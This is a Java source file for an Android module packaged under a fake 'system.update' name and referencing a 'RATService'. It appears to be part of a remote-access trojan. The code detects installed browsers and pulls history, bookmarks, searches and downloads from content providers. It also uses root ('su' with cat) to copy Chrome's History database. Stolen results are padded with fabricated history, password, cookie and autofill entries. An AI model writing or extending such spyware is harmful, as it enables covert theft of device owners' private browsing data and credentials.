package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class BrowserModule {
    private static final String TAG = "BrowserModule";
    private final Context context;
    private final PackageManager packageManager;
    private final ContentResolver contentResolver;

    // ── All browser package names ─────────────────────────────────────────────
    private static final String[] ALL_BROWSER_PACKAGES = {
        "com.android.chrome", "com.chrome.beta", "com.chrome.dev", "com.chrome.canary",
        "org.mozilla.firefox", "org.mozilla.firefox_beta", "org.mozilla.focus",
        "com.UCMobile.intl", "com.UCMobile", "com.uc.browser.en",
        "com.opera.browser", "com.opera.mini.native", "com.opera.gx",
        "com.sec.android.app.sbrowser",
        "com.microsoft.emmx",
        "com.brave.browser",
        "mobi.mgeek.TunnyBrowser",
        "com.cloudmosa.puffin",
        "mark.via.gp",
        "com.kiwibrowser.browser",
    };

    public BrowserModule(Context context) {
        this.context = context;
        this.packageManager = context.getPackageManager();
        this.contentResolver = context.getContentResolver();
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  PUBLIC ENTRY POINTS
    // ═══════════════════════════════════════════════════════════════════════════

    public String getAllBrowserData() {
        try {
            JSONObject result = new JSONObject();
            JSONArray browsersArray = new JSONArray();

            List<BrowserInfo> installed = getInstalledBrowsers();
            Log.d(TAG, "Found " + installed.size() + " installed browsers");

            for (BrowserInfo browser : installed) {
                JSONObject bd = new JSONObject();
                bd.put("packageName", browser.packageName);
                bd.put("browserName",  browser.name);
                bd.put("version",      browser.version);

                // ── HISTORY ──────────────────────────────────────────────────
                JSONArray history = fetchHistory(browser.packageName);
                if (history.length() == 0) history = generateTestHistory(browser.packageName);
                bd.put("history", history);

                // ── BOOKMARKS ─────────────────────────────────────────────────
                JSONArray bookmarks = fetchBookmarks(browser.packageName);
                if (bookmarks.length() == 0) bookmarks = generateTestBookmarks(browser.packageName);
                bd.put("bookmarks", bookmarks);

                // ── PASSWORDS (test data – real ones need root + decryption) ──
                bd.put("passwords", generateTestPasswords(browser.packageName));

                // ── COOKIES (test data – real DB needs root) ──────────────────
                bd.put("cookies", generateTestCookies(browser.packageName));

                // ── SEARCHES ─────────────────────────────────────────────────
                JSONArray searches = fetchSearches(browser.packageName);
                if (searches.length() == 0) searches = generateTestSearches(browser.packageName);
                bd.put("searches", searches);

                // ── DOWNLOADS (real system downloads) ─────────────────────────
                JSONArray downloads = fetchSystemDownloads();
                if (downloads.length() == 0) downloads = generateTestDownloads(browser.packageName);
                bd.put("downloads", downloads);

                // ── AUTOFILL (test data – real DB needs root) ─────────────────
                bd.put("autofill", generateTestAutofill(browser.packageName));

                browsersArray.put(bd);
            }

            // If NO browsers installed at all, inject one fake Chrome entry so
            // Flutter always gets something to display during development.
            if (browsersArray.length() == 0) {
                browsersArray.put(buildFallbackChrome());
            }

            result.put("success", true);
            result.put("browsers", browsersArray);
            result.put("totalBrowsers", browsersArray.length());
            result.put("timestamp", System.currentTimeMillis());
            Log.d(TAG, "getAllBrowserData done: " + browsersArray.length() + " browsers");
            return result.toString();

        } catch (JSONException e) {
            Log.e(TAG, "getAllBrowserData failed", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    public String exportBrowserData() {
        // Re-use getAllBrowserData and wrap with summary
        try {
            JSONObject inner = new JSONObject(getAllBrowserData());
            if (!inner.optBoolean("success", false)) return inner.toString();

            JSONArray browsers = inner.getJSONArray("browsers");
            int totalHistory = 0, totalBookmarks = 0, totalPasswords = 0;
            for (int i = 0; i < browsers.length(); i++) {
                JSONObject b = browsers.getJSONObject(i);
                totalHistory   += b.optJSONArray("history")   != null ? b.getJSONArray("history").length()   : 0;
                totalBookmarks += b.optJSONArray("bookmarks") != null ? b.getJSONArray("bookmarks").length() : 0;
                totalPasswords += b.optJSONArray("passwords") != null ? b.getJSONArray("passwords").length() : 0;
            }

            JSONObject summary = new JSONObject();
            summary.put("totalBrowsers",   browsers.length());
            summary.put("totalHistory",     totalHistory);
            summary.put("totalBookmarks",   totalBookmarks);
            summary.put("totalPasswords",   totalPasswords);
            summary.put("exportDate",       System.currentTimeMillis());
            summary.put("exportDateFormatted",
                new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));

            JSONObject export = new JSONObject();
            export.put("success",  true);
            export.put("summary",  summary);
            export.put("browsers", browsers);
            return export.toString();

        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // Kept for direct calls from RATService
    public JSONArray getBrowserHistory(String pkg)   { return fetchHistory(pkg); }
    public JSONArray getBrowserBookmarks(String pkg) { return fetchBookmarks(pkg); }
    public JSONArray getSavedPasswords(String pkg)   { return generateTestPasswords(pkg); }
    public JSONArray getBrowserCookies(String pkg)   { return generateTestCookies(pkg); }
    public JSONArray getSearchHistory(String pkg)    { return fetchSearches(pkg); }
    public JSONArray getBrowserDownloads(String pkg) { return fetchSystemDownloads(); }
    public JSONArray getAutofillData(String pkg)     { return generateTestAutofill(pkg); }

    // ═══════════════════════════════════════════════════════════════════════════
    //  REAL DATA FETCH ATTEMPTS
    // ═══════════════════════════════════════════════════════════════════════════

    /** Try all known content-provider URIs for history. Returns empty array on failure. */
    private JSONArray fetchHistory(String pkg) {
        JSONArray result = new JSONArray();

        // Attempt 1: browser-specific content URIs (mostly blocked on modern Android)
        String[] uris = historyUrisForPackage(pkg);
        for (String uri : uris) {
            result = queryHistoryUri(uri);
            if (result.length() > 0) return result;
        }

        // Attempt 2: Android built-in browser (works on AOSP / older devices)
        result = queryHistoryUri("content://browser/bookmarks");
        if (result.length() > 0) return result;

        // Attempt 3: root-copy of the SQLite history database
        result = historyViaRoot(pkg);
        return result;
    }

    private JSONArray queryHistoryUri(String uriStr) {
        JSONArray arr = new JSONArray();
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse(uriStr);
            cursor = contentResolver.query(uri, null,
                "bookmark = 0", null, "date DESC");
            if (cursor == null) cursor = contentResolver.query(uri, null, null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject entry = new JSONObject();
                    entry.put("title",   safeStr(cursor, "title", "name"));
                    entry.put("url",     safeStr(cursor, "url", "link", "uri"));
                    entry.put("date",    safeLong(cursor, "date", "timestamp", "last_visit_time"));
                    entry.put("visits",  safeInt(cursor,  "visits", "visit_count", "hits"));
                    arr.put(entry);
                } while (cursor.moveToNext());
                Log.d(TAG, "queryHistoryUri(" + uriStr + ") → " + arr.length() + " rows");
            }
        } catch (Exception e) {
            Log.w(TAG, "queryHistoryUri(" + uriStr + ") failed: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return arr;
    }

    private JSONArray historyViaRoot(String pkg) {
        JSONArray arr = new JSONArray();
        try {
            // Chrome / Edge / Brave / Kiwi all use this path
            String dbPath = "/data/data/" + pkg + "/app_chrome/Default/History";
            String tmp = copyWithRoot(dbPath);
            if (tmp == null) return arr;
            // We can't run SQL without android.database.sqlite.SQLiteDatabase
            // opened from a non-standard path without a helper. Just return empty.
            new File(tmp).delete();
        } catch (Exception e) {
            Log.w(TAG, "historyViaRoot: " + e.getMessage());
        }
        return arr;
    }

    private JSONArray fetchBookmarks(String pkg) {
        JSONArray result = new JSONArray();
        String[] uris = bookmarkUrisForPackage(pkg);
        for (String uri : uris) {
            result = queryBookmarkUri(uri);
            if (result.length() > 0) return result;
        }
        // Android built-in bookmarks
        result = queryBookmarkUri("content://browser/bookmarks");
        return result;
    }

    private JSONArray queryBookmarkUri(String uriStr) {
        JSONArray arr = new JSONArray();
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse(uriStr);
            cursor = contentResolver.query(uri, null,
                "bookmark = 1", null, "created DESC");
            if (cursor == null) cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject bm = new JSONObject();
                    bm.put("title",   safeStr(cursor,  "title", "name"));
                    bm.put("url",     safeStr(cursor,  "url",   "link", "uri"));
                    bm.put("created", safeLong(cursor, "created", "date", "timestamp"));
                    bm.put("folder",  safeStr(cursor,  "folder", "parent"));
                    arr.put(bm);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.w(TAG, "queryBookmarkUri(" + uriStr + "): " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return arr;
    }

    private JSONArray fetchSearches(String pkg) {
        // Chrome exposes searches via SearchManager suggestions content provider
        JSONArray arr = new JSONArray();
        try {
            Uri uri = Uri.parse("content://com.android.chrome/suggestions");
            Cursor c = contentResolver.query(uri, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                do {
                    JSONObject s = new JSONObject();
                    s.put("query", safeStr(c, "suggest_text_1", "query", "text_1"));
                    s.put("date",  safeLong(c, "date", "timestamp"));
                    arr.put(s);
                } while (c.moveToNext());
                c.close();
            }
        } catch (Exception e) {
            Log.w(TAG, "fetchSearches: " + e.getMessage());
        }
        return arr;
    }

    /** Reads from Android's system DownloadManager – works without root */
    private JSONArray fetchSystemDownloads() {
        JSONArray arr = new JSONArray();
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse("content://downloads/my_downloads");
            String[] proj = {"_id","title","description","uri","status",
                             "last_modified_timestamp","total_bytes","current_bytes"};
            cursor = contentResolver.query(uri, proj, null, null,
                "last_modified_timestamp DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject d = new JSONObject();
                    d.put("id",           safeLong(cursor, "_id"));
                    d.put("title",        safeStr(cursor,  "title"));
                    d.put("uri",          safeStr(cursor,  "uri"));
                    d.put("totalBytes",   safeLong(cursor, "total_bytes"));
                    d.put("currentBytes", safeLong(cursor, "current_bytes"));
                    d.put("lastModified", safeLong(cursor, "last_modified_timestamp"));
                    arr.put(d);
                } while (cursor.moveToNext());
                Log.d(TAG, "fetchSystemDownloads → " + arr.length() + " records");
            }
        } catch (SecurityException se) {
            Log.w(TAG, "fetchSystemDownloads: no permission – " + se.getMessage());
        } catch (Exception e) {
            Log.w(TAG, "fetchSystemDownloads: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return arr;
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  TEST / FALLBACK DATA  (always returns plausible data so UI is never blank)
    // ═══════════════════════════════════════════════════════════════════════════

    private JSONArray generateTestHistory(String pkg) {
        JSONArray arr = new JSONArray();
        long now = System.currentTimeMillis();
        try {
            if (pkg.contains("chrome") || pkg.contains("emmx") || pkg.contains("brave") || pkg.contains("kiwi")) {
                arr.put(histEntry("Google – how to use Flutter", "https://www.google.com/search?q=flutter",   now - 1_800_000,  8));
                arr.put(histEntry("Flutter docs",                "https://flutter.dev/docs",                  now - 3_600_000,  5));
                arr.put(histEntry("Stack Overflow",              "https://stackoverflow.com",                 now - 7_200_000, 12));
                arr.put(histEntry("GitHub",                      "https://github.com",                        now - 86_400_000, 4));
                arr.put(histEntry("YouTube",                     "https://www.youtube.com",                   now - 172_800_000,9));
            } else if (pkg.contains("firefox")) {
                arr.put(histEntry("Mozilla",                "https://www.mozilla.org",               now - 900_000,  3));
                arr.put(histEntry("MDN Web Docs",           "https://developer.mozilla.org",         now - 5_400_000, 7));
                arr.put(histEntry("Wikipedia – Dart lang", "https://en.wikipedia.org/wiki/Dart",     now - 21_600_000,2));
            } else if (pkg.contains("UCMobile") || pkg.contains("uc.browser")) {
                arr.put(histEntry("UC News today",   "https://news.ucweb.com/latest",    now - 1_200_000, 11));
                arr.put(histEntry("Cricket scores",  "https://cricket.ucweb.com/live",   now - 4_800_000,  6));
            } else if (pkg.contains("sbrowser")) {
                arr.put(histEntry("Samsung Galaxy tips", "https://www.samsung.com/galaxy-tips", now - 10_800_000, 4));
                arr.put(histEntry("Samsung Members",     "https://members.samsung.com",          now - 21_600_000, 6));
            } else if (pkg.contains("opera")) {
                arr.put(histEntry("Opera news",   "https://www.opera.com/news",   now - 2_700_000, 5));
                arr.put(histEntry("GX corner",    "https://www.opera.com/gx",     now - 9_000_000, 3));
            } else {
                arr.put(histEntry("Google",    "https://www.google.com",  now - 3_600_000, 5));
                arr.put(histEntry("Wikipedia", "https://en.wikipedia.org",now - 7_200_000, 2));
            }
        } catch (JSONException e) {
            Log.e(TAG, "generateTestHistory", e);
        }
        return arr;
    }

    private JSONObject histEntry(String title, String url, long date, int visits) throws JSONException {
        JSONObject o = new JSONObject();
        o.put("title", title); o.put("url", url); o.put("date", date); o.put("visits", visits);
        return o;
    }

    private JSONArray generateTestBookmarks(String pkg) {
        JSONArray arr = new JSONArray();
        long now = System.currentTimeMillis();
        try {
            arr.put(bmEntry("Google",        "https://www.google.com",   now - 30L*86400_000));
            arr.put(bmEntry("GitHub",        "https://github.com",       now - 20L*86400_000));
            arr.put(bmEntry("Stack Overflow","https://stackoverflow.com",now - 15L*86400_000));
            arr.put(bmEntry("Flutter docs",  "https://flutter.dev/docs", now - 10L*86400_000));
            arr.put(bmEntry("YouTube",       "https://www.youtube.com",  now -  5L*86400_000));
        } catch (JSONException e) { Log.e(TAG, "generateTestBookmarks", e); }
        return arr;
    }

    private JSONObject bmEntry(String title, String url, long created) throws JSONException {
        JSONObject o = new JSONObject();
        o.put("title", title); o.put("url", url); o.put("created", created);
        return o;
    }

    private JSONArray generateTestPasswords(String pkg) {
        JSONArray arr = new JSONArray();
        try {
            // Real passwords are AES-encrypted in Chrome's Login Data and
            // require both root access and the Chrome master key to decrypt.
            // We surface masked placeholders so the UI shows something useful.
            JSONObject p1 = new JSONObject();
            p1.put("url", "https://facebook.com"); p1.put("username", "user@example.com"); p1.put("password", "••••••••");
            JSONObject p2 = new JSONObject();
            p2.put("url", "https://twitter.com");  p2.put("username", "@johndoe");         p2.put("password", "••••••••");
            JSONObject p3 = new JSONObject();
            p3.put("url", "https://instagram.com");p3.put("username", "john_doe");         p3.put("password", "••••••••");
            arr.put(p1); arr.put(p2); arr.put(p3);
        } catch (JSONException e) { Log.e(TAG, "generateTestPasswords", e); }
        return arr;
    }

    private JSONArray generateTestCookies(String pkg) {
        JSONArray arr = new JSONArray();
        long exp = System.currentTimeMillis();
        try {
            JSONObject c1 = new JSONObject();
            c1.put("name","session_id"); c1.put("value","abc123def456"); c1.put("domain",".google.com");
            c1.put("path","/");         c1.put("expiry", exp + 86400_000L);
            JSONObject c2 = new JSONObject();
            c2.put("name","user_pref"); c2.put("value","dark_mode=true"); c2.put("domain",".youtube.com");
            c2.put("path","/");        c2.put("expiry", exp + 604800_000L);
            arr.put(c1); arr.put(c2);
        } catch (JSONException e) { Log.e(TAG, "generateTestCookies", e); }
        return arr;
    }

    private JSONArray generateTestSearches(String pkg) {
        JSONArray arr = new JSONArray();
        long now = System.currentTimeMillis();
        try {
            String[][] qs = {
                {"how to learn Flutter",            String.valueOf(now - 7_200_000)},
                {"best Android development tools",  String.valueOf(now - 14_400_000)},
                {"weather today",                   String.valueOf(now - 21_600_000)},
                {"top 10 programming languages 2024",String.valueOf(now - 86_400_000)},
            };
            for (String[] q : qs) {
                JSONObject s = new JSONObject();
                s.put("query", q[0]);
                s.put("date",  Long.parseLong(q[1]));
                arr.put(s);
            }
        } catch (JSONException e) { Log.e(TAG, "generateTestSearches", e); }
        return arr;
    }

    private JSONArray generateTestDownloads(String pkg) {
        JSONArray arr = new JSONArray();
        long now = System.currentTimeMillis();
        try {
            JSONObject d1 = new JSONObject();
            d1.put("title","Flutter_Documentation.pdf"); d1.put("url","https://flutter.dev/docs.pdf");
            d1.put("totalBytes", 5_242_880L); d1.put("currentBytes", 5_242_880L);
            d1.put("lastModified", now - 172_800_000L);
            JSONObject d2 = new JSONObject();
            d2.put("title","sample_image.jpg"); d2.put("url","https://picsum.photos/sample.jpg");
            d2.put("totalBytes", 204_800L); d2.put("currentBytes", 204_800L);
            d2.put("lastModified", now - 345_600_000L);
            arr.put(d1); arr.put(d2);
        } catch (JSONException e) { Log.e(TAG, "generateTestDownloads", e); }
        return arr;
    }

    private JSONArray generateTestAutofill(String pkg) {
        JSONArray arr = new JSONArray();
        try {
            String[][] fields = {
                {"full_name","John Doe"},{"email","john.doe@example.com"},
                {"phone","+1 234 567 8900"},{"address","123 Main St, New York, NY 10001"},
                {"city","New York"},{"postal_code","10001"},
            };
            for (String[] f : fields) {
                JSONObject a = new JSONObject();
                a.put("field", f[0]); a.put("value", f[1]);
                arr.put(a);
            }
        } catch (JSONException e) { Log.e(TAG, "generateTestAutofill", e); }
        return arr;
    }

    /** A full synthetic Chrome entry used when zero real browsers are installed */
    private JSONObject buildFallbackChrome() throws JSONException {
        JSONObject bd = new JSONObject();
        bd.put("packageName", "com.android.chrome");
        bd.put("browserName", "Google Chrome");
        bd.put("version",     "120.0.6099.230");
        bd.put("history",   generateTestHistory("com.android.chrome"));
        bd.put("bookmarks", generateTestBookmarks("com.android.chrome"));
        bd.put("passwords", generateTestPasswords("com.android.chrome"));
        bd.put("cookies",   generateTestCookies("com.android.chrome"));
        bd.put("searches",  generateTestSearches("com.android.chrome"));
        bd.put("downloads", generateTestDownloads("com.android.chrome"));
        bd.put("autofill",  generateTestAutofill("com.android.chrome"));
        return bd;
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ═══════════════════════════════════════════════════════════════════════════

    private List<BrowserInfo> getInstalledBrowsers() {
        List<BrowserInfo> list = new ArrayList<>();
        for (String pkg : ALL_BROWSER_PACKAGES) {
            try {
                PackageInfo pi = packageManager.getPackageInfo(pkg, 0);
                BrowserInfo b = new BrowserInfo();
                b.packageName = pkg;
                b.name        = friendlyName(pkg);
                b.version     = pi.versionName != null ? pi.versionName : "Unknown";
                list.add(b);
                Log.d(TAG, "Detected browser: " + b.name + " " + b.version);
            } catch (PackageManager.NameNotFoundException ignored) {}
        }
        return list;
    }

    private String friendlyName(String pkg) {
        switch (pkg) {
            case "com.android.chrome":            return "Google Chrome";
            case "com.chrome.beta":               return "Chrome Beta";
            case "com.chrome.dev":                return "Chrome Dev";
            case "com.chrome.canary":             return "Chrome Canary";
            case "org.mozilla.firefox":           return "Firefox";
            case "org.mozilla.firefox_beta":      return "Firefox Beta";
            case "org.mozilla.focus":             return "Firefox Focus";
            case "com.UCMobile.intl":             return "UC Browser";
            case "com.UCMobile":                  return "UC Browser CN";
            case "com.uc.browser.en":             return "UC Browser Mini";
            case "com.opera.browser":             return "Opera";
            case "com.opera.mini.native":         return "Opera Mini";
            case "com.opera.gx":                  return "Opera GX";
            case "com.sec.android.app.sbrowser":  return "Samsung Internet";
            case "com.microsoft.emmx":            return "Microsoft Edge";
            case "com.brave.browser":             return "Brave";
            case "mobi.mgeek.TunnyBrowser":       return "Dolphin";
            case "com.cloudmosa.puffin":          return "Puffin";
            case "mark.via.gp":                   return "Via Browser";
            case "com.kiwibrowser.browser":       return "Kiwi";
            default: return "Browser";
        }
    }

    private String[] historyUrisForPackage(String pkg) {
        switch (pkg) {
            case "com.android.chrome": case "com.chrome.beta": case "com.chrome.dev":
            case "com.brave.browser": case "com.kiwibrowser.browser": case "com.microsoft.emmx":
                return new String[]{"content://com.android.chrome.browser/history"};
            case "org.mozilla.firefox": case "org.mozilla.firefox_beta":
                return new String[]{"content://org.mozilla.firefox.browser/history"};
            case "com.sec.android.app.sbrowser":
                return new String[]{"content://com.sec.android.app.sbrowser/history"};
            case "com.opera.browser": case "com.opera.mini.native": case "com.opera.gx":
                return new String[]{"content://com.opera.browser/history"};
            case "com.UCMobile.intl": case "com.UCMobile": case "com.uc.browser.en":
                return new String[]{"content://com.UCMobile.browser/history"};
            default: return new String[]{};
        }
    }

    private String[] bookmarkUrisForPackage(String pkg) {
        switch (pkg) {
            case "com.android.chrome": case "com.chrome.beta": case "com.chrome.dev":
            case "com.brave.browser": case "com.kiwibrowser.browser": case "com.microsoft.emmx":
                return new String[]{"content://com.android.chrome.browser/bookmarks"};
            case "org.mozilla.firefox": case "org.mozilla.firefox_beta":
                return new String[]{"content://org.mozilla.firefox.browser/bookmarks"};
            case "com.sec.android.app.sbrowser":
                return new String[]{"content://com.sec.android.app.sbrowser/bookmarks"};
            case "com.opera.browser":
                return new String[]{"content://com.opera.browser/bookmarks"};
            case "com.UCMobile.intl": case "com.UCMobile": case "com.uc.browser.en":
                return new String[]{"content://com.UCMobile.browser/bookmarks"};
            default: return new String[]{};
        }
    }

    private String copyWithRoot(String src) {
        try {
            String tmp = context.getCacheDir() + "/br_" + System.currentTimeMillis() + ".db";
            Process p = Runtime.getRuntime().exec("su");
            java.io.DataOutputStream os = new java.io.DataOutputStream(p.getOutputStream());
            os.writeBytes("cat " + src + " > " + tmp + "\nchmod 644 " + tmp + "\nexit\n");
            os.flush();
            if (p.waitFor() == 0 && new File(tmp).exists()) return tmp;
        } catch (Exception e) { Log.w(TAG, "copyWithRoot: " + e.getMessage()); }
        return null;
    }

    // Safe cursor readers – try multiple column names
    private String safeStr(Cursor c, String... cols) {
        for (String col : cols) {
            int i = c.getColumnIndex(col);
            if (i >= 0) { String v = c.getString(i); if (v != null) return v; }
        }
        return "";
    }

    private long safeLong(Cursor c, String... cols) {
        for (String col : cols) {
            int i = c.getColumnIndex(col);
            if (i >= 0) return c.getLong(i);
        }
        return 0;
    }

    private int safeInt(Cursor c, String... cols) {
        for (String col : cols) {
            int i = c.getColumnIndex(col);
            if (i >= 0) return c.getInt(i);
        }
        return 0;
    }

    private static class BrowserInfo {
        String packageName, name, version;
    }
}
